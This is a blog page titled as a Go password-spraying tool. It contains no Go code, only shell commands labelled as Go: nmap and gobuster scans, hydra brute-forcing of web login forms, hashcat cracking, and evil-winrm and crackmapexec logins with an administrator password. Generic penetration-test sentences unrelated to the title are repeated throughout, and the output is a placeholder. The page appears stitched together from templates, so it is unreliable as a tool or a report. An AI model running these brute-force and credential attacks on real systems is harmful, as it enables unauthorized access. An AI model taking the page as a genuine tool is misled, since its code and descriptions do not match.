---
TitleSEO: "Password Spraying Tool in Go | ZureFX"
TitlePost: "Password Spraying Tool — Go"
Author: "ZureFX"
Description: "A Go script for password spraying tool. Built for security research and automation."
Keywords: "tool, script, go, bash"
URL: "https://zurefx.github.io/scripting/script-password-spraying-tool-839.html"
URL_IMAGES: ""
Date: "2024-06-22"
Tags: "Tool, Script, Go, Bash"
Section: "scripting"
Lang: "en"
main_img: "script-password-spraying-tool-839"
Permalink: "/scripting/script-password-spraying-tool-839.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The web application was vulnerable to Server-Side Template Injection (SSTI). Group Policy Preferences contained encrypted but recoverable credentials. Network traffic analysis revealed unencrypted communications containing user credentials.

Built with **Go** for offensive security automation.

### Requirements

- Go
- `chisel`
- `feroxbuster`
- `secretsdump`

## Implementation

### Core Logic

The backup files contained sensitive information that should not have been accessible. Authentication bypass was achieved through careful manipulation of the login mechanism.

```go
gobuster dir -u http://10.115.225.118/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
evil-winrm -i 10.43.59.158 -u administrator -p 'P@ssw0rd!'
gobuster dir -u http://10.29.184.142/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The service account had excessive permissions assigned in Active Directory. The target system was identified as running a vulnerable version of the service.

### Helper Functions

Group Policy Preferences contained encrypted but recoverable credentials. Weak file permissions allowed modification of critical system files.

```go
nmap -sCV -p110,993,3268 10.56.180.164 -oN scan.txt
nmap -sCV -p389,21,443 10.111.60.90 -oN scan.txt
nmap -sCV -p1521,587,3268 10.45.251.217 -oN scan.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

## Usage

### Basic Usage

The database credentials were hardcoded in the application source code. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
gobuster dir -u http://10.63.46.231/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.60.81.49 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.52.253.72 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
```

### Advanced Options

Initial enumeration revealed several interesting open ports on the target. Command injection was possible through unsanitized user input in the search functionality. The backup files contained sensitive information that should not have been accessible.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.74.48.44 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.18.86.41 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
gobuster dir -u http://10.11.13.159/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
crackmapexec smb 10.60.69.193 -u administrator -p 'P@ssw0rd!' --shares
```

## Output

### Example Output

The target system was identified as running a vulnerable version of the service. Unconstrained delegation was enabled on the compromised machine.

```
[+] Scanning target...
[+] Found 18 results
[+] Done in 21.17s
```
